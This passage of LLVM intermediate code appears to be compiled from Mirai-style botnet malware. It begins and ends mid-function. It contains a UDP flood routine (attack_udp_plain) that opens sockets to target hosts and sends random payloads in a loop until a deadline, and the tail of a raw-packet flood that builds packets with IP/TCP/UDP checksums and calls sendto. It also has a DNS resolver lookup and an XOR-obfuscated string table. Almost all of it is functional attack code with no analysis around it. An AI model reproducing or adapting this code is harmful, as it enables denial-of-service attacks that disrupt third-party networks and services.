  store i8 0, i8* %156, align 1
  %157 = getelementptr inbounds i8, i8* %137, i64 10
  %158 = bitcast i8* %157 to i16*
  store i16 0, i16* %158, align 2
  %159 = bitcast i8* %137 to i16*
  %160 = call zeroext i16 @checksum_generic(i16* %159, i32 20)
  store i16 %160, i16* %158, align 2
  %161 = getelementptr inbounds i8, i8* %137, i64 26
  %162 = bitcast i8* %161 to i16*
  store i16 0, i16* %162, align 2
  %163 = getelementptr inbounds i8, i8* %137, i64 24
  %164 = bitcast i8* %163 to i16*
  %165 = load i16, i16* %164, align 2
  %166 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %138, i8* %139, i16 zeroext %165, i32 %62)
  store i16 %166, i16* %162, align 2
  %167 = load i32, i32* %6, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %168, i32 0, i32 2, i32 0
  store i32 %27, i32* %169, align 4
  %170 = getelementptr inbounds i8, i8* %137, i64 22
  %171 = bitcast i8* %170 to i16*
  %172 = load i16, i16* %171, align 2
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %168, i32 0, i32 1
  store i16 %172, i16* %173, align 2
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %168, i32 0
  %175 = bitcast %struct.sockaddr_in* %174 to %struct.sockaddr*
  %176 = call i64 @sendto(i32 %34, i8* %137, i64 %.pre144, i32 16384, %struct.sockaddr* %175, i32 16) #10
  %177 = load i32, i32* %6, align 4
  %178 = add nsw i32 %177, 1
  store i32 %178, i32* %6, align 4
  %179 = icmp slt i32 %178, %40
  br i1 %179, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %155
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %134
  %180 = call i64 @time(i64* null) #10
  %181 = icmp sgt i64 %180, %52
  br i1 %181, label %.loopexit.loopexit, label %134

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %32, %5, %50
  ret void

; <label>:182:                                    ; preds = %.lr.ph133.1146
  %183 = add i8 %.1, 1
  br label %187

; <label>:184:                                    ; preds = %.lr.ph133.1146
  store i8 %.1, i8* %.1123, align 1
  %185 = getelementptr inbounds i8, i8* %107, i64 %indvars.iv.next
  %186 = getelementptr inbounds i8, i8* %185, i64 1
  br label %187

; <label>:187:                                    ; preds = %184, %182
  %.1123.1 = phi i8* [ %186, %184 ], [ %.1123, %182 ]
  %.1.1 = phi i8 [ 0, %184 ], [ %183, %182 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge134.loopexit.unr-lcssa, label %.lr.ph133
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_dns_resolver() unnamed_addr #0 {
  %1 = alloca [2048 x i8], align 16
  %2 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 37)
  %3 = tail call i8* @table_retrieve_val(i32 37, i32* null)
  %4 = tail call i32 (i8*, i32, ...) @open(i8* %3, i32 0) #10
  tail call void @table_lock_val(i8 zeroext 37)
  %5 = icmp sgt i32 %4, -1
  br i1 %5, label %6, label %.loopexit

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 0
  %8 = call i64 @read(i32 %4, i8* nonnull %7, i64 2048) #10
  %9 = trunc i64 %8 to i32
  %10 = tail call i32 @close(i32 %4) #10
  tail call void @table_unlock_val(i8 zeroext 38)
  %11 = tail call i8* @table_retrieve_val(i32 38, i32* null)
  %12 = call i32 @util_stristr(i8* nonnull %7, i32 %9, i8* %11) #10
  call void @table_lock_val(i8 zeroext 38)
  %13 = icmp ne i32 %12, -1
  %14 = icmp slt i32 %12, %9
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %6
  %.old = add nsw i32 %9, -1
  %15 = sext i32 %12 to i64
  %sext = shl i64 %8, 32
  %16 = ashr exact i64 %sext, 32
  br label %17

; <label>:17:                                     ; preds = %.lr.ph, %35
  %indvars.iv = phi i64 [ %15, %.lr.ph ], [ %indvars.iv.next, %35 ]
  %.02633 = phi i8 [ 0, %.lr.ph ], [ %.2, %35 ]
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %indvars.iv
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %.02633, 0
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %17
  switch i8 %19, label %22 [
    i8 32, label %35
    i8 9, label %35
  ]

; <label>:22:                                     ; preds = %21, %17
  %.1 = phi i8 [ %.02633, %17 ], [ 1, %21 ]
  %23 = icmp eq i8 %19, 46
  %24 = trunc i64 %indvars.iv to i32
  br i1 %23, label %28, label %25

; <label>:25:                                     ; preds = %22
  %.off = add i8 %19, -48
  %26 = icmp ugt i8 %.off, 9
  %27 = icmp eq i32 %24, %.old
  %or.cond29 = or i1 %27, %26
  br i1 %or.cond29, label %.critedge, label %35

; <label>:28:                                     ; preds = %22
  %.old28 = icmp eq i32 %24, %.old
  br i1 %.old28, label %.critedge, label %35

.critedge:                                        ; preds = %28, %25
  %.02731.lcssa = phi i32 [ %.old, %28 ], [ %24, %25 ]
  %29 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %15
  %31 = sub nsw i32 %.02731.lcssa, %12
  call void @util_memcpy(i8* nonnull %29, i8* %30, i32 %31) #10
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 %32
  store i8 0, i8* %33, align 1
  %34 = call i32 @inet_addr(i8* nonnull %29) #10
  br label %38

; <label>:35:                                     ; preds = %25, %21, %21, %28
  %.2 = phi i8 [ %.1, %28 ], [ 0, %21 ], [ 0, %21 ], [ %.1, %25 ]
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %36 = icmp slt i64 %indvars.iv.next, %16
  br i1 %36, label %17, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %35
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %6, %0
  %37 = call i32 @htonl(i32 134744072) #11
  br label %38

; <label>:38:                                     ; preds = %.loopexit, %.critedge
  %.0 = phi i32 [ %34, %.critedge ], [ %37, %.loopexit ]
  ret i32 %.0
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call noalias i8* @calloc(i64 %7, i64 4) #10
  %11 = bitcast i8* %10 to i32*
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %17 = trunc i32 %16 to i8
  %18 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %18, i8 0, i64 16, i32 4, i1 false)
  %19 = tail call i64 @time(i64* null) #10
  %20 = zext i32 %0 to i64
  %21 = add i64 %19, %20
  %22 = and i32 %14, 65535
  %23 = icmp eq i32 %22, 65535
  br i1 %23, label %27, label %24

; <label>:24:                                     ; preds = %5
  %25 = trunc i32 %14 to i16
  %26 = tail call zeroext i16 @htons(i16 zeroext %25) #11
  br label %27

; <label>:27:                                     ; preds = %5, %24
  %.062 = phi i16 [ %26, %24 ], [ 0, %5 ]
  %28 = icmp eq i8 %1, 0
  br i1 %28, label %.preheader, label %.lr.ph68

.lr.ph68:                                         ; preds = %27
  %29 = and i32 %12, 65535
  %30 = icmp eq i32 %29, 65535
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %34 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %35 = zext i8 %1 to i64
  br label %39

.preheader.loopexit:                              ; preds = %61
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %27
  %sext = shl i64 %21, 32
  %36 = ashr exact i64 %sext, 32
  %37 = icmp eq i8 %17, 0
  %.mask = and i32 %15, 65535
  %38 = zext i32 %.mask to i64
  %wide.trip.count = zext i8 %1 to i64
  br label %65

; <label>:39:                                     ; preds = %.lr.ph68, %61
  %indvars.iv70 = phi i64 [ 0, %.lr.ph68 ], [ %indvars.iv.next71, %61 ]
  %40 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %41 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv70
  store i8* %40, i8** %41, align 8
  br i1 %30, label %44, label %42

; <label>:42:                                     ; preds = %39
  %43 = call zeroext i16 @htons(i16 zeroext %13) #11
  br label %44

; <label>:44:                                     ; preds = %39, %42
  %.sink = phi i16 [ %43, %42 ], [ 0, %39 ]
  %45 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv70
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv70, i32 0, i32 1
  store i16 %.sink, i16* %46, align 2
  %47 = call i32 @socket(i32 2, i32 2, i32 17) #10
  %48 = getelementptr inbounds i32, i32* %11, i64 %indvars.iv70
  store i32 %47, i32* %48, align 4
  %49 = icmp eq i32 %47, -1
  br i1 %49, label %.loopexit.loopexit74, label %50

; <label>:50:                                     ; preds = %44
  store i16 2, i16* %31, align 4
  store i16 %.062, i16* %32, align 2
  store i32 0, i32* %33, align 4
  %51 = call i32 @bind(i32 %47, %struct.sockaddr* nonnull %34, i32 16) #10
  %52 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv70, i32 2
  %53 = load i8, i8* %52, align 4
  %54 = icmp ult i8 %53, 32
  br i1 %54, label %55, label %61

; <label>:55:                                     ; preds = %50
  %56 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv70, i32 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @ntohl(i32 %57) #11
  %59 = call i32 @htonl(i32 %58) #11
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv70, i32 0, i32 2, i32 0
  store i32 %59, i32* %60, align 4
  br label %61

; <label>:61:                                     ; preds = %55, %50
  %62 = bitcast %struct.attack_target* %45 to %struct.sockaddr*
  %63 = call i32 @connect(i32 %47, %struct.sockaddr* %62, i32 16) #10
  %indvars.iv.next71 = add nuw nsw i64 %indvars.iv70, 1
  %64 = icmp slt i64 %indvars.iv.next71, %35
  br i1 %64, label %39, label %.preheader.loopexit

; <label>:65:                                     ; preds = %.preheader, %._crit_edge
  br i1 %28, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %65
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %70
  %indvars.iv = phi i64 [ %indvars.iv.next, %70 ], [ 0, %.lr.ph.preheader ]
  %66 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  %67 = load i8*, i8** %66, align 8
  br i1 %37, label %70, label %68

; <label>:68:                                     ; preds = %.lr.ph
  call void @rand_alphastr(i8* %67, i32 %.mask)
  %69 = getelementptr inbounds i8, i8* %67, i64 %38
  store i8 0, i8* %69, align 1
  br label %70

; <label>:70:                                     ; preds = %.lr.ph, %68
  %71 = getelementptr inbounds i32, i32* %11, i64 %indvars.iv
  %72 = load i32, i32* %71, align 4
  %73 = call i64 @send(i32 %72, i8* %67, i64 %38, i32 16384) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %70
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %65
  %74 = call i64 @time(i64* null) #10
  %75 = icmp sgt i64 %74, %36
  br i1 %75, label %.loopexit.loopexit, label %65

.loopexit.loopexit:                               ; preds = %._crit_edge
  br label %.loopexit

.loopexit.loopexit74:                             ; preds = %44
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit74, %.loopexit.loopexit
  ret void
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #5 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %addconv27 = add nuw i32 %5, 1
  %min.iters.check = icmp ult i32 %addconv27, 4
  br i1 %min.iters.check, label %.lr.ph.preheader28, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %8 = zext i32 %addconv27 to i64
  %9 = and i32 %addconv27, 3
  %n.mod.vf = zext i32 %9 to i64
  %n.vec = sub nsw i64 %8, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %10 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %1, %10
  %ind.end21 = getelementptr i16, i16* %0, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph.preheader28, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <2 x i64> [ %16, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi22 = phi <2 x i64> [ %17, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %0, i64 %index
  %11 = bitcast i16* %next.gep to <2 x i16>*
  %wide.load = load <2 x i16>, <2 x i16>* %11, align 2
  %12 = getelementptr i16, i16* %next.gep, i64 2
  %13 = bitcast i16* %12 to <2 x i16>*
  %wide.load25 = load <2 x i16>, <2 x i16>* %13, align 2
  %14 = zext <2 x i16> %wide.load to <2 x i64>
  %15 = zext <2 x i16> %wide.load25 to <2 x i64>
  %16 = add <2 x i64> %14, %vec.phi
  %17 = add <2 x i64> %15, %vec.phi22
  %index.next = add i64 %index, 4
  %18 = icmp eq i64 %index.next, %n.vec
  br i1 %18, label %middle.block, label %vector.body, !llvm.loop !3

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <2 x i64> %17, %16
  %rdx.shuf = shufflevector <2 x i64> %bin.rdx, <2 x i64> undef, <2 x i32> <i32 1, i32 undef>
  %bin.rdx26 = add <2 x i64> %bin.rdx, %rdx.shuf
  %19 = extractelement <2 x i64> %bin.rdx26, i32 0
  %cmp.n = icmp eq i32 %9, 0
  br i1 %cmp.n, label %._crit_edge.loopexit, label %.lr.ph.preheader28

.lr.ph.preheader28:                               ; preds = %middle.block, %min.iters.checked, %.lr.ph.preheader
  %.015.ph = phi i64 [ 0, %min.iters.checked ], [ 0, %.lr.ph.preheader ], [ %19, %middle.block ]
  %.01114.ph = phi i32 [ %1, %min.iters.checked ], [ %1, %.lr.ph.preheader ], [ %ind.end, %middle.block ]
  %.01213.ph = phi i16* [ %0, %min.iters.checked ], [ %0, %.lr.ph.preheader ], [ %ind.end21, %middle.block ]
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader28, %.lr.ph
  %.015 = phi i64 [ %23, %.lr.ph ], [ %.015.ph, %.lr.ph.preheader28 ]
  %.01114 = phi i32 [ %24, %.lr.ph ], [ %.01114.ph, %.lr.ph.preheader28 ]
  %.01213 = phi i16* [ %20, %.lr.ph ], [ %.01213.ph, %.lr.ph.preheader28 ]
  %20 = getelementptr inbounds i16, i16* %.01213, i64 1
  %21 = load i16, i16* %.01213, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.015
  %24 = add i32 %.01114, -2
  %25 = icmp ugt i32 %24, 1
  br i1 %25, label %.lr.ph, label %._crit_edge.loopexit.loopexit, !llvm.loop !6

._crit_edge.loopexit.loopexit:                    ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %._crit_edge.loopexit.loopexit, %middle.block
  %.lcssa = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %27 = icmp eq i32 %.011.lcssa, 1
  br i1 %27, label %28, label %33

; <label>:28:                                     ; preds = %._crit_edge
  %29 = load i16, i16* %.012.lcssa, align 2
  %30 = zext i16 %29 to i64
  %sext = shl i64 %30, 56
  %31 = ashr exact i64 %sext, 56
  %32 = add i64 %31, %.0.lcssa
  br label %33

; <label>:33:                                     ; preds = %28, %._crit_edge
  %.1 = phi i64 [ %32, %28 ], [ %.0.lcssa, %._crit_edge ]
  %34 = lshr i64 %.1, 16
  %35 = and i64 %.1, 65535
  %36 = add nuw nsw i64 %34, %35
  %37 = lshr i64 %36, 16
  %38 = add nuw nsw i64 %37, %36
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %39, -1
  ret i16 %40
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #7 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %addconv = add nuw i32 %18, 1
  %min.iters.check = icmp ult i32 %addconv, 8
  br i1 %min.iters.check, label %.lr.ph33.preheader53, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph33.preheader
  %19 = zext i32 %addconv to i64
  %20 = and i32 %addconv, 7
  %n.mod.vf = zext i32 %20 to i64
  %n.vec = sub nsw i64 %19, %n.mod.vf
  %cmp.zero = icmp eq i64 %n.vec, 0
  %cast.crd = trunc i64 %n.vec to i32
  %21 = shl i32 %cast.crd, 1
  %ind.end = sub i32 %3, %21
  %ind.end45 = getelementptr i16, i16* %10, i64 %n.vec
  br i1 %cmp.zero, label %.lr.ph33.preheader53, label %vector.body.preheader

vector.body.preheader:                            ; preds = %min.iters.checked
  br label %vector.body

vector.body:                                      ; preds = %vector.body.preheader, %vector.body
  %index = phi i64 [ %index.next, %vector.body ], [ 0, %vector.body.preheader ]
  %vec.phi = phi <4 x i32> [ %27, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %vec.phi47 = phi <4 x i32> [ %28, %vector.body ], [ zeroinitializer, %vector.body.preheader ]
  %next.gep = getelementptr i16, i16* %10, i64 %index
  %22 = bitcast i16* %next.gep to <4 x i16>*
  %wide.load = load <4 x i16>, <4 x i16>* %22, align 2
  %23 = getelementptr i16, i16* %next.gep, i64 4
  %24 = bitcast i16* %23 to <4 x i16>*
  %wide.load49 = load <4 x i16>, <4 x i16>* %24, align 2
  %25 = zext <4 x i16> %wide.load to <4 x i32>
  %26 = zext <4 x i16> %wide.load49 to <4 x i32>
  %27 = add <4 x i32> %25, %vec.phi
  %28 = add <4 x i32> %26, %vec.phi47
  %index.next = add i64 %index, 8
  %29 = icmp eq i64 %index.next, %n.vec
  br i1 %29, label %middle.block, label %vector.body, !llvm.loop !8

middle.block:                                     ; preds = %vector.body
  %bin.rdx = add <4 x i32> %28, %27
  %rdx.shuf = shufflevector <4 x i32> %bin.rdx, <4 x i32> undef, <4 x i32> <i32 2, i32 3, i32 undef, i32 undef>
  %bin.rdx50 = add <4 x i32> %bin.rdx, %rdx.shuf
  %rdx.shuf51 = shufflevector <4 x i32> %bin.rdx50, <4 x i32> undef, <4 x i32> <i32 1, i32 undef, i32 undef, i32 undef>
  %bin.rdx52 = add <4 x i32> %bin.rdx50, %rdx.shuf51
  %30 = extractelement <4 x i32> %bin.rdx52, i32 0
  %cmp.n = icmp eq i32 %20, 0
  br i1 %cmp.n, label %._crit_edge34.loopexit, label %.lr.ph33.preheader53

.lr.ph33.preheader53:                             ; preds = %middle.block, %min.iters.checked, %.lr.ph33.preheader
  %.031.ph = phi i32 [ %3, %min.iters.checked ], [ %3, %.lr.ph33.preheader ], [ %ind.end, %middle.block ]
  %.02630.ph = phi i32 [ 0, %min.iters.checked ], [ 0, %.lr.ph33.preheader ], [ %30, %middle.block ]
  %.02729.ph = phi i16* [ %10, %min.iters.checked ], [ %10, %.lr.ph33.preheader ], [ %ind.end45, %middle.block ]
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33.preheader53, %.lr.ph33
  %.031 = phi i32 [ %35, %.lr.ph33 ], [ %.031.ph, %.lr.ph33.preheader53 ]
  %.02630 = phi i32 [ %33, %.lr.ph33 ], [ %.02630.ph, %.lr.ph33.preheader53 ]
  %.02729 = phi i16* [ %34, %.lr.ph33 ], [ %.02729.ph, %.lr.ph33.preheader53 ]
  %31 = load i16, i16* %.02729, align 2
  %32 = zext i16 %31 to i32
  %33 = add i32 %32, %.02630
  %34 = getelementptr inbounds i16, i16* %.02729, i64 1
  %35 = add nsw i32 %.031, -2
  %36 = icmp sgt i32 %35, 1
  br i1 %36, label %.lr.ph33, label %._crit_edge34.loopexit.loopexit, !llvm.loop !9

._crit_edge34.loopexit.loopexit:                  ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %._crit_edge34.loopexit.loopexit, %middle.block
  %.lcssa43 = phi i32 [ %30, %middle.block ], [ %33, %._crit_edge34.loopexit.loopexit ]
  %37 = sub i32 %11, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %38 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa43, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %37, %._crit_edge34.loopexit ]
  %39 = icmp eq i32 %.0.lcssa, 1
  br i1 %39, label %40, label %44

; <label>:40:                                     ; preds = %._crit_edge34
  %41 = load i8, i8* %38, align 1
  %42 = zext i8 %41 to i32
  %43 = add i32 %42, %.026.lcssa
  br label %44

; <label>:44:                                     ; preds = %40, %._crit_edge34
  %.1 = phi i32 [ %43, %40 ], [ %.026.lcssa, %._crit_edge34 ]
  %45 = lshr i32 %6, 16
  %46 = and i32 %6, 65535
  %47 = lshr i32 %8, 16
  %48 = and i32 %8, 65535
  %49 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i16
  %52 = tail call zeroext i16 @htons(i16 zeroext %51) #11
  %53 = zext i16 %52 to i32
  %54 = zext i16 %2 to i32
  %55 = add nuw nsw i32 %45, %54
  %56 = add nuw nsw i32 %55, %46
  %57 = add nuw nsw i32 %56, %47
  %58 = add nuw nsw i32 %57, %48
  %59 = add i32 %58, %.1
  %60 = add i32 %59, %53
  %61 = lshr i32 %60, 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %44
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %63 = phi i32 [ %66, %.lr.ph ], [ %61, %.lr.ph.preheader ]
  %.228 = phi i32 [ %65, %.lr.ph ], [ %60, %.lr.ph.preheader ]
  %64 = and i32 %.228, 65535
  %65 = add nuw nsw i32 %64, %63
  %66 = lshr i32 %65, 16
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %44
  %.2.lcssa = phi i32 [ %60, %44 ], [ %65, %._crit_edge.loopexit ]
  %68 = trunc i32 %.2.lcssa to i16
  %69 = xor i16 %68, -1
  ret i16 %69
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #8 {
  ret i32 0
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 61)
  %4 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 0
  %5 = tail call i8* @table_retrieve_val(i32 61, i32* null)
  %6 = call i8* @strcpy(i8* nonnull %4, i8* %5) #10
  %7 = icmp eq i32 %1, 0
  br i1 %7, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %8, %.lr.ph ], [ %1, %.lr.ph.preheader ]
  %.012 = phi i8* [ %11, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %8 = add nsw i32 %.03, -1
  %9 = call i32 @util_strlen(i8* nonnull %4) #10
  %10 = load i8, i8* %4, align 16
  %11 = getelementptr inbounds i8, i8* %.012, i64 1
  store i8 %10, i8* %.012, align 1
  %12 = icmp eq i32 %8, 0
  br i1 %12, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  call void @table_lock_val(i8 zeroext 61)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #9 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
